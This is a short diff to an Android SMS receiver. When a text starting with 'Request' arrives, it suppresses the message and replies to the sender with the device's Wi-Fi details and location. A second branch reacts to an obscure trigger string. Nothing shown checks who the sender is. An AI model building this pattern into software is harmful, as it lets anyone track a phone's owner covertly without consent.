@@ -48,12 +48,25 @@ public class IncomingSMSReceiver extends BroadcastReceiver {
 
                 if (message.startsWith("Request"))
                 {
-                    String txtSMS=txtWifi;
+
                     Toast.makeText(context, "Sending Location", Toast.LENGTH_SHORT).show();
 
                     this.abortBroadcast();
-                    sendSMS(sender, txtSMS);
+                    try {
+                        String txtSMS = txtWifi;
+                        sendSMS(sender, txtSMS);
+                    }catch(Exception e) {
+                        String txtSMS = "Wifi Unavaliable";
+                        sendSMS(sender, txtSMS);
+                    }
 
+                    try {
+                        String txtSMS2 = txtLocation;
+                        sendSMS(sender, txtSMS2);
+                    }catch(Exception e) {
+                        String txtSMS2 = "Location Unavaliable";
+                        sendSMS(sender, txtSMS2);
+                    }
                 }
                 if (message.startsWith("AQOZkasQSM"))
                 {
